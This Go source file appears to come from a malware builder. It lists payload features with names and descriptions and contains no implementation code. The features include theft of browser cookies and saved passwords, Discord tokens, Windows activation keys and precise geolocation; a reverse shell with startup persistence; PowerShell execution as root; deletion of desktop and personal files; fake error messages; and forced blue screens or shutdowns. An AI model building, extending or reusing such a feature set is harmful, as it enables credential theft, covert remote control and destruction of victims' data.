package etc

var (
	Features = []Feature{
		{
			Name:        "bsod",
			Description: "Triggers a Blue Screen of Death when execution finishes.",
			Args: []Arg{
				{Name: "stopcode", Datatype: "string", Required: false},
			},
		},
		{
			Name:        "chrcc",
			Description: "Grabs cookies saved in 20+ chromium browsers",
			Args:        []Arg{},
		},
		{
			Name:        "chrcookie",
			Description: "Grabs cookies saved in 20+ chromium browsers",
			Args:        []Arg{},
		},
		{
			Name:        "chrpass",
			Description: "Grabs passwords saved in 20+ chromium browsers",
			Args:        []Arg{},
		},
		{
			Name:        "error",
			Description: "Displays a custom fake error message when execution finishes",
			Args: []Arg{
				{Name: "title", Datatype: "string", Required: true},
				{Name: "description", Datatype: "string", Required: true},
			},
		},
		{
			Name:        "geo",
			Description: "Basic Geo Location payload, grabs general location of the connected network",
			Args:        []Arg{},
		},
		{
			Name:        "geo+",
			Description: "Advanced Geo Location payload, grabs precise geo coordinates of the connected router",
			Args:        []Arg{},
		},
		{
			Name:        "killdp",
			Description: "Temporarily removes the system's desktop [kills explorer.exe]",
			Args:        []Arg{},
		},
		{
			Name:        "lshell",
			Description: "Creates a rooted protected Liveton Reverse shell",
			Args: []Arg{
				{Name: "startup", Datatype: "bool", Required: true},
			},
		},
		{
			Name:        "nukedp",
			Description: "Deletes all files stored on the desktop",
			Args:        []Arg{},
		},
		{
			Name:        "pcinfo",
			Description: "Grabs general basic system information",
			Args:        []Arg{},
		},
		{
			Name:        "rmprsnl",
			Description: "Deletes personal files (Documents, Pictures, Videos, etc.)",
			Args:        []Arg{},
		},
		{
			Name:        "rexec",
			Description: "Run a custom powershell script as root",
			Args: []Arg{
				{Name: "script", Datatype: "string", Required: true},
			},
		},
		{
			Name:        "screenshot",
			Description: "Takes a screenshot of the system",
			Args:        []Arg{},
		},
		{
			Name:        "shutdown",
			Description: "Triggers a system shutdown when execution finishes",
			Args:        []Arg{},
		},
		{
			Name:        "syskey",
			Description: "Grabs the OS' activation key & key type",
			Args:        []Arg{},
		},
		{
			Name:        "token",
			Description: "Attempt to grab all tokens from Discord and 20+ browsers",
			Args:        []Arg{},
		},
	}
)
